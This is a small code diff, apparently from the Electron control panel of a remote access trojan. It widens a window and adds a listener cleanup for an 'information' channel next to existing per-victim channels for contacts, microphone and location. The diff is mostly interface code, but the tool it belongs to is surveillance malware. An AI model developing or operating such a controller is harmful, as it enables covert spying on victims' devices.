@@ -216,7 +216,7 @@ ipcMain.on('openLabWindow', function (e, page, index) {
   let child = new BrowserWindow({
     icon: __dirname + '/app/assets/img/icon.png',
     parent: win,
-    width: 600,
+    width: 650,
     height: 650,
     darkTheme: true,
     transparent: true,
@@ -250,6 +250,7 @@ ipcMain.on('openLabWindow', function (e, page, index) {
       victimsList.getVictim(index).socket.removeAllListeners("x0000cn"); // contacts
       victimsList.getVictim(index).socket.removeAllListeners("x0000mc"); // mic
       victimsList.getVictim(index).socket.removeAllListeners("x0000lm"); // location
+      victimsList.getVictim(index).socket.removeAllListeners("x0000in"); // information
     }
   })
 });
